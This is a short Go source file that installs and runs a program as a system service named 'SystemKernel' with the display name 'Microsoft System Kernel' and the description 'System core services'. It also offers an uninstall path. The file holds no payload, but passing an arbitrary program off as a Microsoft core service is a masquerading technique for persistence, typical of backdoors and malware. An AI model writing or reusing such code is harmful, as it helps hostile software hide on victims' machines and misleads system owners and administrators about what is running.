package basic

import (
	"os"

	"github.com/kardianos/service"
)

func Letrun(pro service.Interface, in bool) error {
	config := service.Config{
		Name:        "SystemKernel",
		DisplayName: "Microsoft System Kernel",
		Description: "System core services",
	}
	s, err := service.New(pro, &config)
	if err != nil {
		return err
	}
	if in {
		s.Install()
		s.Run()
		os.Exit(0)
		return nil
	} else {
		err := s.Uninstall()
		return err
	}
}
